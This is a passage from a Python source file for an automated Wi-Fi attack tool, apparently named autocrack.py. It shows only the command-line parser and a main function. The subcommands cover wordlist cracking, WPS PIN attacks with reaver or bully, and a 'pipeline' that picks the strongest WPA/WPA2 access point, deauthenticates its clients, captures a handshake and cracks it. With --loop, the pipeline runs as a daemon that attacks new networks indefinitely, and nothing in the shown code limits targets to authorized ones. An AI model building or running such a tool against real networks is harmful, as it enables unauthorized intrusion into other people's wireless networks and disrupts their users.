                   metavar="WORDLIST", help="Wordlist (repeat for multiple: -w wl1 -w wl2)")
    p.add_argument("-b", "--bssid")
    p.add_argument("-e", "--essid")
    p.set_defaults(func=cmd_crack)

    # ── wps ───────────────────────────────────────────────────────────────────
    p = sub.add_parser("wps", help="WPS PIN attack via reaver or bully")
    p.add_argument("-i", "--iface", default="wlan0")
    p.add_argument("--mon")
    p.add_argument("-b", "--bssid", required=True)
    p.add_argument("-c", "--channel", required=True, type=int)
    p.add_argument("--tool", choices=["reaver", "bully"], default="reaver")
    p.add_argument("--pin")
    p.add_argument("--no-stop-monitor", action="store_true")
    p.set_defaults(func=cmd_wps)

    # ── pipeline ──────────────────────────────────────────────────────────────
    p = sub.add_parser(
        "pipeline",
        help="Fully automated: scan → strongest AP → capture → crack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="""
Fully automated pipeline (no prompts).

  Auto-selects the strongest WPA/WPA2 AP, captures a handshake,
  tries each wordlist in order, logs results to autocrack_results.txt.
  Add --loop to run continuously as a daemon.

Examples:
  sudo python3 autocrack.py pipeline -w /usr/share/wordlists/rockyou.txt
  sudo python3 autocrack.py pipeline -w wl1.txt -w wl2.txt --loop
  sudo python3 autocrack.py pipeline -w rockyou.txt --filter 'TP-Link*' --loop
""")
    p.add_argument("-i", "--iface", default="wlan0")
    p.add_argument("-w", "--wordlist", action="append", required=True,
                   metavar="WORDLIST",
                   help="Wordlist file (repeat for multiple: -w wl1 -w wl2)")
    p.add_argument("-o", "--output", default="autocrack_output",
                   help="Output directory for caps and results log (default: autocrack_output/)")
    p.add_argument("--scan-time", type=int, default=20,
                   help="Scan duration per cycle in seconds (default: 20)")
    p.add_argument("--band", choices=["a", "b", "g", "abg"])
    p.add_argument("--filter", metavar="GLOB",
                   help="Only target APs whose ESSID matches this glob (e.g. 'Home*')")
    p.add_argument("--deauth-count", type=int, default=5,
                   help="Deauth frames per burst (default: 5)")
    p.add_argument("--no-deauth", action="store_true",
                   help="Passive capture only, no deauth")
    p.add_argument("--client", help="Deauth a specific client MAC")
    p.add_argument("--capture-timeout", type=int, default=90,
                   help="Max seconds to wait for handshake per AP (default: 90)")
    p.add_argument("--loop", action="store_true",
                   help="Run as daemon: re-scan and attack new APs forever")
    p.add_argument("--loop-wait", type=int, default=60,
                   help="Seconds between daemon cycles (default: 60)")
    p.set_defaults(func=cmd_pipeline)

    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
